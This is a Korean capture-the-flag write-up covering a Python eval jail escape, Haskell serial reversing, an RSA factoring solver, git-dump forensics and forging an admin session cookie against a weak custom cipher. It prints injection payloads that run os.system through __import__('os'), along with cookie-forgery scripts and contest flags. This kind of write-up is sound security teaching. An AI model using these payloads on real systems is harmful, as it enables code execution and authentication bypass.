## Impel Down 

가능한 작업은 4개로 주어지지만, 접속할 시 한번에 입력할 수 있는 커맨드가 38자라고 알려주기 때문에 `eval()`등의 함수를 사용하는 것을 추측할 수 있습니다.

```
[day-1] 
################## Work List ##################
  coworker        : Find Coworker For Escape
  tool            : Find Any Tool
  dig             : Go Deep~
  bomb            : make boooooooomb!!!
###############################################
coworkertool
Traceback (most recent call last):
  File "/home/impel_down/Impel_Down.py", line 140, in <module>
    result = eval("your."+work+"()")
  File "<string>", line 1, in <module>
AttributeError: Esacpe_Player instance has no attribute 'coworkertool'
```

`coworkertool` 을 입력해보았더니 `eval()`을 사용하는 것을 알 수 있습니다.

`your`의 attribute들을 알아내기 위해서 `dig(sys.stdout.write(str(dir(your))))` 를 실행하면 다음과 같은 결과를 얻을 수 있습니다.

```
['__doc__', '__init__', '__module__', 'bomb', 'bomb_Perfection', 'coworker', 'coworkers', 'day', 'dig', 'dig_depth', 'name', 'tool', 'tools']
```

마찬가지 방법으로 local variable들을 살펴보기 위해 `dig(sys.stdout.write(str(locals())))` 를 실행하면 다음과 같은 결과를 얻을 수 있습니다.

```
{'cmd': 'bomb', 'shuffle': <bound method Random.shuffle of <random.Random object at 0x2592a70>>, 'watcher': <__main__.Watcher instance at 0x7f4377a03ea8>, 'invalid_cmd': 1, 'your': <__main__.Esacpe_Player instance at 0x7f4377a03c20>, 'menu': <function menu at 0x7f4377a13f50>, '__package__': None, 'handler': <function handler at 0x7f4377a14050>, 'Esacpe_Player': <class __main__.Esacpe_Player at 0x7f43779ff8d8>, '__doc__': None, 'works_list': {'coworker': 'Find Coworker For Escape', 'tool': 'Find Any Tool', 'dig': 'Go Deep~', 'bomb': 'make boooooooomb!!!'}, '__builtins__': <module '__builtin__' (built-in)>, '__file__': '/home/impel_down/Impel_Down.py', 'choice': <bound method Random.choice of <random.Random object at 0x2592a70>>, 'sys': <module 'sys' (built-in)>, 'tools_list': ['drill', 'Knife', 'gun', 'spoon', 'book', 'lighter'], '__name__': '__main__', 'ban_list': ['#', '+', '-', '_', '"'], 'ww': ')', 'name': '', 'work': 'dig()%sys.stdout.write(str(locals()))', 'Watcher': <class __main__.Watcher at 0x7f43779ff7a0>, 'coworkers_list': ['James', 'Nami', 'Luffy', 'Zoro', 'Tony', 'Robin', 'Franky', 'Brook', 'Ace', 'Jinbe', 'Crocodile'], 'pickle': <module 'pickle' from '/usr/lib/python2.7/pickle.pyc'>}
```

우리는 `your.name`을 통해서 실행 초기에 입력하는 이름을 사용할 수 있습니다. 다행히도, 이름 입력에는 어떠한 제한도 걸려있지 않습니다. 또한 우리는 `locals()`로부터 파일의 이름이 `Impel_Down.py`인 것을 알고 있습니다. 그러므로 이름을 `sys.stdout.write(file('Impel_Down.py').read())` 로 설정하고 `dig(eval(your.name))`를 실행하면 소스 파일을 읽어낼 수 있습니다.

```python
del signal
del __builtins__.input
ban_list = ['#', '+', '-', '_', '"']

name = raw_input(" Name : ")
your = Esacpe_Player(name, 1)
watcher = Watcher()

# FLAG is /FLAG_FILE~blahblah (this is only executable.)

while True:
  print "[day-%d] " %(your.day)
  if your.day == 4:
    # Turn off the light
    print "Turn off the Light !!"
    sys.stdout = open('/dev/null', 'w')

  menu()
  work = raw_input()
  invalid_cmd = 0
  for cmd in works_list.keys():
    if cmd in work:
      invalid_cmd = 1

  if not invalid_cmd:
    print "Invalid Work !!"
    continue

  for ww in work:
    if ww in ban_list:
      print "Found unavailable Character !!"
      exit()

  if len(work) > 38:
    print "Too Long !!"
    continue

  result = eval("your."+work+"()")
  watcher.Behavior_analysis(result)

  your.day += 1
  if your.day > 10:
    sys.stderr.write("10 days over...\n")
    exit()
```

root에 FLAG 파일이 있는 것을 알 수 있습니다. name에 `sys.stdout.write(str(__import__('os').listdir('/')))`를 입력해 확인해보면 `FLAG_FLAG_FLAG_LOLOLOLOLOLOL`라는 파일이 있는 것을 확인할 수 있습니다. `__import__('os').system('/FLAG_FLAG_FLAG_LOLOLOLOLOLOL')`를 통해 실행하면 `FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}`를 얻을 수 있습니다.



## easy_serial

조금만 분석해보면 Haskell로 작성된 바이너리임을 알 수 있습니다. hsdecomp를 통해서 decompile하면 다음과 같은 코드를 얻습니다. (hsdecomp로 얻은 코드를 약간 수정해 human-readable하게 했습니다.)

```
Main_main_closure = >> $fMonadIO

	-- This is print
    (putStrLn (unpackCString# "Input Serial Key >>> "))
	
	-- main
    (>>= $fMonadIO
        getLine
        (\s1dZ_info_arg_0 ->
            >> $fMonadIO
                (putStrLn (++ (unpackCString# "your serial key >>> ") (++ s1b7_info (++ (unpackCString# "_") (++ s1b9_info (++ (unpackCString# "_") s1bb_info))))))
				
                (
				case && (== $fEqInt (ord (!! s1b7_info loc_7172456)) (I# 70))
				        (&& (== $fEqInt (ord (!! s1b7_info loc_7172472)) (I# 108)) 
						    (&& (== $fEqInt (ord (!! s1b7_info loc_7172488)) (I# 97))
								(&& (== $fEqInt (ord (!! s1b7_info loc_7172504)) (I# 103)) 
									(&& (== $fEqInt (ord (!! s1b7_info loc_7172520)) (I# 123))
										(&& (== $fEqInt (ord (!! s1b7_info loc_7172536)) (I# 83)) 
											(&& (== $fEqInt (ord (!! s1b7_info loc_7172552)) (I# 48)) 
												(&& (== $fEqInt (ord (!! s1b7_info loc_7172568)) (I# 109))
													(&& (== $fEqInt (ord (!! s1b7_info loc_7172584)) (I# 101)) 
														(&& (== $fEqInt (ord (!! s1b7_info loc_7172600)) (I# 48))
															(&& (== $fEqInt (ord (!! s1b7_info (I# 10))) (I# 102)) 
																(&& (== $fEqInt (ord (!! s1b7_info (I# 11))) (I# 85))
																	(== $fEqInt (ord (!! s1b7_info (I# 12))) (I# 53))
																)
															)
														)
													)
												)
											)
										)
									)
								)
							)
						) of
                    <tag 1> -> putStrLn (unpackCString# ":p"),
                    c1ni_info_case_tag_DEFAULT_arg_0@_DEFAULT -> case == ($fEq[] $fEqChar) (reverse s1b9_info) (: (C# 103) (: (C# 110) (: (C# 105) (: (C# 107) (: loc_7168872 (: loc_7168872 (: (C# 76) (: (C# 51) (: (C# 114) (: (C# 52) [])))))))))) of
                        False -> putStrLn (unpackCString# ":p"),
                        True -> case && (== $fEqChar (!! s1bb_info loc_7172456) (!! s1b3_info loc_7172456))
										(&& (== $fEqChar (!! s1bb_info loc_7172472) (!! s1b4_info (I# 19))) 
											(&& (== $fEqChar (!! s1bb_info loc_7172488) (!! s1b3_info (I# 19))) 
												(&& (== $fEqChar (!! s1bb_info loc_7172504) (!! s1b4_info loc_7172568)) 
													(&& (== $fEqChar (!! s1bb_info loc_7172520) (!! s1b2_info loc_7172488)) 
														(&& (== $fEqChar (!! s1bb_info loc_7172536) (!! s1b3_info (I# 18))) 
															(&& (== $fEqChar (!! s1bb_info loc_7172552) (!! s1b4_info (I# 19))) 
																(&& (== $fEqChar (!! s1bb_info loc_7172568) (!! s1b2_info loc_7172504)) 
																	(&& (== $fEqChar (!! s1bb_info loc_7172584) (!! s1b4_info (I# 17))) 
																		(== $fEqChar (!! s1bb_info loc_7172600) (!! s1b4_info (I# 18)))
																	)
																)
															)
														)
													)
												)
											)
										) of
                            <tag 1> -> putStrLn (unpackCString# ":p"),
                            c1tb_info_case_tag_DEFAULT_arg_0@_DEFAULT -> putStrLn (unpackCString# "Correct Serial Key! Auth Flag!")
                )
        )
    )
s1b4_info = unpackCString# "abcdefghijklmnopqrstuvwxyz"
loc_7172600 = I# 9
s1bb_info = !! s1b5_info loc_7172488
loc_7172488 = I# 2
s1b5_info = splitOn $fEqChar (unpackCString# "#") s1dZ_info_arg_0
loc_7172584 = I# 8
loc_7172504 = I# 3
s1b2_info = unpackCString# "1234567890"
loc_7172568 = I# 7
loc_7172552 = I# 6
s1b3_info = unpackCString# "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
loc_7172536 = I# 5
loc_7172520 = I# 4
loc_7172472 = I# 1
loc_7172456 = I# 0
loc_7168872 = C# 48
s1b9_info = !! s1b5_info loc_7172472
s1b7_info = !! s1b5_info loc_7172456
```

`#`으로 연결된 3개의 string을 입력으로 받고, 14~26번째 줄이 첫 번째 string, 39번째 줄이 두 번째 string, 41~50번째 줄이 세 번째 string을 체크하는 것을 알 수 있습니다. 조건이 복잡하지 않고 단순해 string의 i번째 글자가 어떤 글자인지 체크할 뿐이므로, 이를 그대로 복구하면 `Flag{S0me0fU5#4r3L00king#AtTh3St4rs` 를 얻을 수 있습니다. (`}`는 실수로 안 넣은 것 같습니다.)



## RSAbaby

해당 풀이는 unintended solution이라고 생각합니다.

문제에서 준 `h=(d+p)^(d-p)`는 `p`의 bit수를 추측할 수 있게 해줍니다. `h`가 2051bit이므로, `p`는 대략 2050~2049bit임을 알 수 있습니다. `g`는 `d*(p-0xdeadbeef)`이고, 6143bit입니다. 이를 통해 `d`는 대략 4093~4094bit임을 알 수 있습니다.

여기에 `e`를 곱하면 재밌는 전개가 가능합니다. `0xdeadbeef`를 `t`라고 합시다.
$$
eg = ed(p-a) = (k(p-1)(q-1)+1)(p-a) = (k(p-1)(N/p-1)+1)(p-a)\\
=-kp^2+(kt+kN+k+1)p-(ktN+kt+t+kN)+kNt/p
$$
이를 정리하면 `p`에 대한 3차 방정식을 얻을 수 있습니다.
$$
-kp^3+(kt+kN+k+1)p^2-(ktN+kt+t+kN+ge)p+kNt=0
$$
`d`가 대략 4093~4094bit 임을 알고 있고 `e`가 65537이므로 `ed`는 4110~4111bit 정도이고, `N`이 4096bit이므로 `k`는 14~15bit임을 알 수 있습니다.

`k`를 적당히 16384를 넣은뒤, 해당 식을 한 번 미분해 극점을 구해보면 `p`가 각각 2048, 4096bit 정도의 값을 가집니다. 이를 통해, 극점 사이에 존재하는 정수해가 존재한다면 이것이 `p`임을 알 수 있습니다. 그러므로 다음과 같은 solver를 작성할 수 있습니다.

```python
#N, g, e, t 설정은 생략
import gmpy2
from gmpy2 import mpz
import sys

def func(a, b, c, d, x):
    return a*x*x*x + b*x*x + c*x + d

for k in range(8192, 65338): # 14 ~ 15 bit maybe
    a = -k
    b = k*t + k*N + k + 1
    c = -(k*t*N + k*t + t + k*N + g*e)
    d = k*N*t

    r = gmpy2.iroot(4*b*b-12*a*c, 2)[0] # not precise, but fast
    
    xs = (-2*b + r) // (6*a)
    xe = (-2*b - r) // (6*a)

    cnt = 0
    while xs < xe:
        xm = (xs + xe) // 2
        val = func(a,b,c,d,xm)
        if val > 0:
            xe = xm
        else:
            xs = xm+1

    for i in range(-5, 6):
        if func(a,b,c,d,xs+i) == 0:
            if N % (xs+i) != 0:
                print("TOO SAD: " + str(xs+i))
                continue
            print("XS!!!!: " + str(xs+i))
            sys.exit(0)
    print(k)
```

실행하면 `k=57092`에서 `p=31811409645348549623053449127882290862674231133369271929416098209276377067302796737455793747462538422614379700918706241193833498111023310629026997212318192772109850300415441179803269106674140038023990825750895043565738242596321975272419171937493287441285653336571630433705006757726534166691981294592999707642674052088390419616606622130059758448387087832788561620913931294383792135875155036952024480631900978472396033035431761843696320186521041303944663483631883324759141512482298880961799997836823971848883954715830737467614012122590472338779677938311809056604574465104112824215617234766193478186952789711517365429489`를 얻습니다. 이를 통해 flag를 구하면 `Whatever you do, the Basics are the most important :-D` (실제 message에는 해당 flag 뒤로 `*`가 상당히 많이 붙어있습니다.) 를 얻을 수 있습니다.



## Useless

페이지에 접속한 뒤 `/.git` 에 접근을 시도해보면 403 에러가 반깁니다. git forensic 문제이므로, git dumper를 통해서 git dump를 얻습니다. (https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh)

git log는 다음과 같습니다.

```
commit ab117952cf9db060c337dcb90e782171377eab0b
Author: joonuree <joonuree@gmail.com>
Date:   Thu Feb 1 20:09:25 2018 +0900

    useless

commit 72949062a18d1a23d392c87a1a6555cdddb83014
Author: joonuree <joonuree@gmail.com>
Date:   Thu Feb 1 20:07:26 2018 +0900

    commit
```

72949로 checkout하면 `enc.py` 와 `readme.md`가 있습니다. `readme.md`의 내용은 다음과 같습니다.

```
## algorithm for session cookie  

### Basic
- general user >> username + user IP
- **admin**        >> admin + 127.0.0.1

### example
- username : `codegate`, IP : `211.224.255.84`
    - `codegate211.224.255.84` >> (encrypt) >> setting cookie
```

`enc.py`를 통해 `admin127.0.0.1`을 암호화하면 됩니다. `enc.py`에는 `Encrypt` class가 정의되어있고, `encrypt()`를 통해서 암호문을 얻을 수 있습니다. 이를 쿠키로 설정하면 flag page로 연결되고 flag page에서는 `ENCRYPTME{It's_reaLLy_n0nsen5_th4t_I_5p3nt_M0ney_more_7h4n_My_6udg3t.}` 에서 {} 안의 내용을 한 번 더 encrypt해서 제출하라고 나옵니다. 이를 한 번 더 encrypt하면 `1678766808377c204d4a062d550c536f3d783868306d262550154b6129702f485378396821494c52171e695d4f16493c79783f681f4e1c411b045e0b227b2443` 가 나옵니다.

##Useless returnz 

Useless returnz는 똑같은 페이지지만 암호화에서 `Encrypt` class에 정의된 key와 다른 key를 사용합니다. 원래는  `Encrypt`에 key와 iv가 다음과 같이 정의되어있습니다.

```python
class Encrypt():

    def __init__(self, iv=None, keystr=None):
        self.iv = "useles5@"
        self.keystr = "SUCK_7h15+4lG0_!"
        self.init_matrix = []
        self.init_matrix = []

        chunk1 = self.keystr[0:8]
        chunk2 = self.keystr[8:16]
        row = []


        for i in range(0, 8):
            for j in range(0, 8):
                row.append(ord(chunk1[i]) ^ ord(chunk2[j]))

            self.init_matrix.append(row[0:8])

            del row[:]
...
```

key가 바뀌면 `init_matrix`가 다르게 생성되는 것을 알 수 있습니다. 이제 암호화 루틴을 살펴봅시다.

```python
    def encrypt(self, plaintxt):

        p_chunks = self.change(plaintxt)
        e_chunks = []

        for i in range(0, len(p_chunks)):
            if i == 0:
                xor = (self.change(self.iv)[0])

            temp = self.xor_calc(xor, p_chunks[i])
            e_chunks.append(self.encblock(temp, i))

            del xor[:]
            del temp[:]

            xor.extend(e_chunks[i])


        enctxt = ""

        for i in range(0, len(e_chunks)):
            for j in range(0, 8):
                enctxt += chr(e_chunks[i][j])


        return enctxt.encode('hex')
```

`change()`는 단순히 문자열의 각 문자를 `ord()`를 취해 배열로 바꿔주고, 이를 8개씩 끊어서 2차원 배열로 만듭니다. 만약 8개씩 잘랐는데 남는다면 해당 부분을 `'x'`로 채웁니다. 그러므로 이 알고리즘은 8 byte block을 가지는 block cipher임을 알 수 있습니다. `xor_calc`는 두 수의 배열을 받아 xor한 하나의 배열로 합쳐줍니다. `encblock()`의 앞부분을 살펴봅시다.

```python
    def encblock(self, chunk, num):

        rows = self.schedule(num)

        block = []
        result = []

        block.append(self.round0(chunk, rows[0]))
        block.append(self.round1(chunk, rows[1]))
        block.append(self.round2(chunk, rows[2]))
        block.append(self.round3(chunk, rows[3]))
        block.append(self.round4(chunk, rows[4]))
        block.append(self.round5(chunk, rows[5]))
        block.append(self.round6(chunk, rows[6]))
        block.append(self.round7(chunk, rows[7]))
...
```

`schedule()`은 다음과 같습니다.

```python
    def schedule(self, num):

        shift = [1, 2, 3, 2, 2, 1, 2, 3]
        temp = []
        matrix = []


        if num%2 == 0:
            for i in range(0, 8):
                for j in range(0, 8):
                    temp.append(self.init_matrix[i][(8 - shift[i] + j)%8])

                matrix.append(temp[0:8])
                del temp[:]


        else:
            for i in range(0, 8):
                for j in range(0, 8):
                    temp.append(self.init_matrix[i][(shift[i] + j)%8])

                matrix.append(temp[0:8])
                del temp[:]


        return matrix
```

단순히 이번 block의 index(`num`)이 짝수냐 홀수냐에 따라서 `init_matrix`을 적당히 shift해서 내놓는 것을 알 수 있습니다. 그러므로 `schedule()`은 `num`이 짝수거나 홀수일 때 항상 같은 matrix를 반환합니다.

round의 예시로 `round0()`을 살펴보면 다음과 같습니다.

```python
    def round0(self, p_chunk, k_chunk):

        temp = []

        temp.append(p_chunk[0] - 10 + k_chunk[0])
        temp.append(p_chunk[1] ^ k_chunk[1])
        temp.append(p_chunk[2] + k_chunk[2])
        temp.append(p_chunk[3] % (k_chunk[3]+2) + 32)
        temp.append(p_chunk[4] * 2 - k_chunk[3] - 7)
        temp.append(p_chunk[5] - 11 - k_chunk[5]%13)
        temp.append(p_chunk[6] ^ k_chunk[6])
        temp.append(p_chunk[7] * 5 / (k_chunk[7] + 5))

        return temp
```

단순히 각 chunk의 같은 index 자리에 있는 값들을 서로 취해 다른 값을 내놓는 것을 볼 수 있습니다.

그런데, 이 문제의 핵심은 `encblock()`의 뒷부분입니다.

```python
...
        if num%2 == 0:
            result.append(chunk[0]^block[0][1]^block[1][2]^block[2][3])
            result.append(chunk[1]^block[0][1]^block[1][2]^block[3][2])
            result.append(chunk[2]^block[0][1]^block[2][3]^block[3][2])
            result.append(chunk[3]^block[1][2]^block[2][3]^block[3][2])
            result.append(chunk[4]^block[4][2]^block[5][1]^block[6][2])
            result.append(chunk[5]^block[4][2]^block[5][1]^block[7][3])
            result.append(chunk[6]^block[4][2]^block[6][2]^block[7][3])
            result.append(chunk[7]^block[5][1]^block[6][2]^block[7][3])

        else:
            result.append(chunk[0]^block[0][6]^block[1][5]^block[2][4])
            result.append(chunk[1]^block[0][6]^block[1][5]^block[3][5])
            result.append(chunk[2]^block[0][6]^block[2][4]^block[3][5])
            result.append(chunk[3]^block[1][5]^block[2][4]^block[3][5])
            result.append(chunk[4]^block[4][5]^block[5][6]^block[6][5])
            result.append(chunk[5]^block[4][5]^block[5][6]^block[7][4])
            result.append(chunk[6]^block[4][5]^block[6][5]^block[7][4])
            result.append(chunk[7]^block[5][6]^block[6][5]^block[7][4])


        return result
```

열심히 `round0()~round7()`을 통해서 값들을 구했지만 일부 값만 사용하는 모습을 살펴볼 수 있습니다. 그런데, `block[0][1]`은 `round0()`의 정의대로라면 `chunk[1] ^ rows[0][1]` 입니다. 그리고 `block[0][6]`은 `chunk[6] ^ row[0][6]` 입니다. 심지어 암호화에 쓰이는 다른 값들도 모두 xor로만 구성되어 있습니다. 즉, 암호화에 쓰인 `block[i][j]`는 모두 `chunk[j] ^ row[i][j]`입니다. 이를 모두 대입해 계산해보면 `result[i]`는 `row[i][j]`를 xor하여 만들어진 상수에 `chunk[i]`들을 xor한 값임을 알 수 있습니다. 그러므로, 적당한 string 하나를 암호화한 값을 알고 있으면 해당 결과 값에 원래 암호화에 쓰인 `chunk[i]`를 xor한 뒤, 우리가 원하는 string으로부터 얻어진 `chunk[i]`를 xor하면 key를 모르더라도 원하는 string을 암호화한 값을 얻어낼 수 있습니다.

우선 `admin127`로 가입한 뒤, 다음 코드로 `admin127.0.0.1`을 암호화한 값을 알아냈습니다.

첫 번째 block의 값이 동일하므로, 두 번째 block만 xor해주면 되며, `round1_xor`과 `round2_xor`은 `result[i]`에 xor된 `chunk[j]` 들을 list로 나타낸 것입니다.

```python
s = 'admin127' + '141.223.175.228' + 'x'
val = '5e0a4973106c3f7720573c634d757c5c650a76731357341a'

want = 'admin' + '127.0.0.1' + 'xx'

round1_xor = [ [0, 1, 2, 3], [], [1, 3], [], [1, 4], [1, 2, 3, 5], [3, 6], [1, 2, 3, 7] ]
round2_xor = [ [0, 4, 5, 6], [1, 6], [2, 4, 5, 6], [3, 4], [4, 6], [4, 6], [4, 6], [4, 5, 6, 7] ]

def to_hex(x):
    x = hex(x)
    if len(x) > 2 and x[:2] == '0x':
        x = x[2:]
    if len(x) == 1: x = '0' + x
    return x
  
ans = val[:16]
for i in range(8):
    v = int(val[16 + 2*i : 16 + 2*i + 2], 16)
    for j in round2_xor[i]:
        v = v ^ ord(s[8+j]) ^ ord(want[8+j])
    ans += to_hex(v)
print(ans)
```

이를 통해 admin으로 들어가 flag page를 보면, Useless와 마찬가지로 `IT's_Wh3re_MY_De4M0n5_Hid3_###_`를 암호화해서 제출하라고 page에서 말합니다. 이에 대한 solver는 다음과 같습니다.

```python
s = 'admin127' + '141.223.175.228' + 'x'
val = '5e0a4973106c3f7720573c634d757c5c650a76731357341a'

want = 'IT\'s_Wh3re_MY_De4M0n5_Hid3_###_' + 'x'

round1_xor = [ [0, 1, 2, 3], [], [1, 3], [], [1, 4], [1, 2, 3, 5], [3, 6], [1, 2, 3, 7] ]
round2_xor = [ [0, 4, 5, 6], [1, 6], [2, 4, 5, 6], [3, 4], [4, 6], [4, 6], [4, 6], [4, 5, 6, 7] ]

def to_hex(x):
    x = hex(x)
    if len(x) > 2 and x[:2] == '0x':
        x = x[2:]
    if len(x) == 1: x = '0' + x
    return x

ans = ""

for i in range(8): #First block
    t = int(val[2*i:2*i+2], 16)
    for j in round1_xor[i]:
        t = t ^ ord(s[j]) ^ ord(want[j])
    ans += to_hex(t)

for i in range(8): #Second block
    t = int(val[2*i+16:2*i+18], 16)
    for j in round2_xor[i]:
        t = t ^ int(val[2*j:2*j+2], 16) ^ int(ans[2*j:2*j+2], 16)
        t = t ^ ord(s[8+j]) ^ ord(want[8+j])
    ans += to_hex(t)

for i in range(8): #Third block
    t = int(val[2*i+32:2*i+34], 16)
    for j in round1_xor[i]:
        t = t ^ int(val[2*j+16:2*j+18], 16) ^ int(ans[2*j+16:2*j+18], 16)
        t = t ^ ord(s[16+j]) ^ ord(want[16+j])
    ans += to_hex(t)
    
for i in range(8): #Fourth block
    t = int(val[2*i+16:2*i+18], 16)
    for j in round2_xor[i]:
        t = t ^ int(val[2*j:2*j+2], 16) ^ int(ans[2*j+32:2*j+34], 16)
        t = t ^ ord(s[8+j]) ^ ord(want[24+j])
    ans += to_hex(t)
print(ans)
```

이를 통해 `160a6373116a7f131d314e6a102821457f0a2373554550303b53573a1a222b22`를 얻을 수 있습니다.